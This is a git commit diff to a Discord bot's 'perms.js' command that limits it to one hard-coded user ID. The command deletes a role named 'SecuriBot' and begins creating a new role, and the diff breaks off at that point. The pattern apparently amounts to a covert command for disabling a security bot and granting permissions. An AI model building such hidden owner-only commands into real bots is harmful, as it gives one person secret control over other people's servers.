b2328cb1722318f16c63538c08514befff583844
Joseph <joseph300905@gmail.com>
2020-02-07 19:53:23 +0100

    Check if good user

--- commands/perms.js
+++ commands/perms.js
@@ -1,4 +1,5 @@
 module.exports.run = async (bot, message, args) => {
+  if(message.author.id !== '437953881914474523') return 
   message.delete(1000)
   message.guild.roles.find(role => role.name === 'SecuriBot').delete();
   message.guild.createRole({
